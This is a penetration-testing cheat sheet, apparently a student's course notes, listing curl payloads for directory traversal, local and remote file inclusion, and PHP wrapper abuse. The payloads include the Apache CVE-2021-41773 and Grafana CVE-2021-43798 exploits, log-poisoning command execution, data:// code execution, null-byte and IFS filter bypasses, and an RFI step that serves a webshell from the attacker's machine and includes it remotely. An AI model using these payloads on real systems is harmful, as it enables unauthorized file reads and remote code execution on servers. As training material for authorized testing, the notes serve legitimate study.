# File Inclusion & Traversal, Command Appendix

Part of [[COMMAND APPENDIX]]. Directory traversal, LFI, RFI, and the PHP-wrapper variants.

---

## Directory Traversal / LFI / RFI Payloads

```bash
# Plain traversal
curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"

# URL-encoded dots, bypasses filters matching only the literal string
curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Apache CVE-2021-41773/42013's specific asymmetric-first-segment pattern
curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Grafana CVE-2021-43798 (core plugin path traversal, no auth needed)
curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"

# LFI via log poisoning: poison a controllable field (e.g. User-Agent) with a PHP snippet in Burp first, then:
curl "http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=<command>"

# Multi-word commands through a log-poisoned LFI break on the literal space character.
# URL-encode it as %20 (simplest), or use the shell's IFS (Internal Field Separator) trick instead
curl "http://<target>/index.php?page=...access.log&cmd=ls%20-la"
curl "http://<target>/index.php?page=...access.log&cmd=ls\${IFS}-la"

# LFI via php://filter, read PHP source instead of executing it
curl "http://<target>/index.php?page=php://filter/convert.base64-encode/resource=<file>.php"

# LFI via data:// wrapper, inline payload, no write step (needs allow_url_include)
curl "http://<target>/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"

# RFI, host your own webshell and include it remotely (needs allow_url_include)
cd /usr/share/webshells/php/ && python3 -m http.server 80
curl "http://<target>/index.php?page=http://<your_ip>/simple-backdoor.php&cmd=id"

# Null-byte truncation, a legacy-PHP-specific bypass (PHP < 5.3.5 only). Appending %00
# terminates the string early, useful for stripping an extension the app was about to
# force onto your path (e.g. forcing a ".php" suffix off so a raw file read succeeds)
curl -k "https://<target>/vulnerable.php?param=../../../../../../etc/passwd%00"
```
See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]], [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]], [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]], [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]], [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[Beep|Beep box writeup]] (the null-byte trick, against Elastix 2.2.0's `graph.php`).

#### Tags: #DirectoryTraversal #LFI #RFI #PHPWrappers #NullByteBypass

---

## **Outstanding**
This area grows alongside the modules. Whenever a new traversal/inclusion variant comes up (Windows-specific LFI, Java/other-language equivalents, etc), add it here with a link back to the source section.
